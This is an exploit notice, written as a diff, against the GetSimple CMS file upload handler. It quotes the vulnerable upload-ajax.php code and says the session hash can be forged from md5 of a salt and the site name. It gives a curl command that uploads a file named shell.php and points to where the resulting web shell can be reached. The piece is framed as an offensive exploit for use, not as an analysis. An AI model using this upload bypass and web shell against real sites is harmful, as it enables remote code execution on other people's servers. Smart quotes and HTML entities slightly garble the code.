@@ -1,0 +1,21 @@
+Bug Code:
+getsimple/admin/upload-ajax.php
+
+if ($_REQUEST[&#039;sessionHash&#039;] === $SESSIONHASH) {
+if (!empty($_FILES))
+{
+$tempFile = $_FILES[&#039;Filedata&#039;][&#039;tmp_name&#039;];
+$name = clean_img_name($_FILES[&#039;Filedata&#039;][&#039;name&#039;]);
+$targetPath = GSDATAUPLOADPATH;
+$targetFile = str_replace(‘//’,&#039;/’,$targetPath) . $name;
+move_uploaded_file($tempFile, $targetFile);
+----------------------------------------------------------------------
+
+Generating SESSIONHASH: md5( $salt. $sitename)
+[XPL]
+
+curl -F “Filedata=@yourshell.txt;filename=shell.php” 
+http://getsimple_localhost/admin/upload-ajax.php\?sessionHash\=HASH CREATO
+
+After, enjoy your Bacon-Shell here ...http://getsimple_localhost/ 
+data/uploads/shell.php
